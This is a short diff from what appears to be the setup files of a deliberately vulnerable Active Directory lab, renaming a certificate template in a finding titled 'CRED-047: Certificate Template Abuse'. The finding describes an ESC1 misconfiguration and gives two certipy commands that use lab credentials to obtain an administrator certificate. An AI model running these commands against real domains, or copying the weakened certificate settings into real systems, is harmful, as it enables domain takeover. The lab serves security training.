@@ -289,12 +289,12 @@
     content: |
       CRED-047: Certificate Template Abuse
       =======================================
-      The ESC1-vulnerable template 'DVADUser' (created by vuln_adcs role) allows
+      The ESC1-vulnerable template 'EMPIREUser' (created by vuln_adcs role) allows
       SAN specification. Combined with StrongCertificateBindingEnforcement=0 (set here),
       any authenticated user can obtain a certificate for an arbitrary principal.
 
       Exploitation:
-        certipy req -u luke.skywalker@empire.local -p SithLord123! -ca corp-CA -template DVADUser \
+        certipy req -u luke.skywalker@empire.local -p SithLord123! -ca corp-CA -template EMPIREUser \
           -upn administrator@empire.local -dc-ip 10.10.0.10
         certipy auth -pfx administrator.pfx -domain empire.local
 
